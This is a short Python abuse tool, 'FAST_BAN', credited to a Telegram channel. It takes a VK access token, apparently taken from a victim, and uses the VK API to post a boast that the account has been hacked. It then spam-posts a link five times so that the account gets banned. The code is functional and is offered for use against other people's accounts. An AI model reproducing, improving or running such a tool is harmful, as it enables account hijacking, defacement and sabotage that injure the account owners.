import requests
import vk_api
import os
import time
from colorama import Fore, Back, Style 
def fastban():
    os.system("clear")
    intro = """  
   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   
    ▒▒▐▐▐▐▐▐▐▐▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▒▒▐▐▒▒▒▒▒▐▐▒▒▒▒▒▐▐▒▒
   ▒▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▐▐▒▒▒▐▐▒▒▒
    ▒▒▐▐▐▐▐▐▒▒▐▐▐▐▐▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▐▐▒▒▐▐▒▒
   ▒▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▐▐▒▒▒▐▐▒▒▐▐▒▐▐▒▒▒
    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▒▒
   ▒▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▒▒▐▐▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
   ▒▒▒                                           ▒▒▒
    ▒▒ FAST_BAN                                  ▒▒
   ▒▒▒  CHANNEL @coding_lab       Version 3.0    ▒▒▒
    ▒▒                                           ▒▒
   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    """
    print(Fore.GREEN + intro)
    print(Fore.WHITE + """
   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒                                           ▒▒
   ▒▒▒  [1] WALL-POST-BAN                        ▒▒▒
    ▒▒  [2] DEVOLOPERS                           ▒▒
   ▒▒▒  [3] EXIT                                 ▒▒▒
    ▒▒                                           ▒▒
   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    """)
    a = input("[Enter number] -> ")
    if a == "1":
        tok = input("[ACCESS-TOKEN] -> ") 
        token = vk_api.VkApi(token = tok) 
        vk = token.get_api()
        vk.wall.post(message='Твоя жопа взломана! Ответственность взял канал в телеграмме @coding_lab')
        for var in range(5):
            time.sleep(3)
            vk.wall.post(message='vto.pe')             
            print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
        print(Back.BLACK + Fore.WHITE + "22")
        os.system("clear")   
        fastban()
    if a == "2":
        print("""
   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒                                           ▒▒
   ▒▒▒ DEVOLOPERS                                ▒▒▒
    ▒▒ TELEGRAM: @cod1ng_lab                     ▒▒
   ▒▒▒ TELEGRAM: @BatyaRimskiy1                  ▒▒▒
    ▒▒ Для выхода в главное меню нажмите Enter   ▒▒
   ▒▒▒                                           ▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 
        """)
        c = input("-> : ")
        if c == "1":
            os.system("clear")
            fastban()
        else:
            os.system("clear")
            fastban()
    if a == "3":
        os.system("exit")
    else:
        fastban()
fastban()
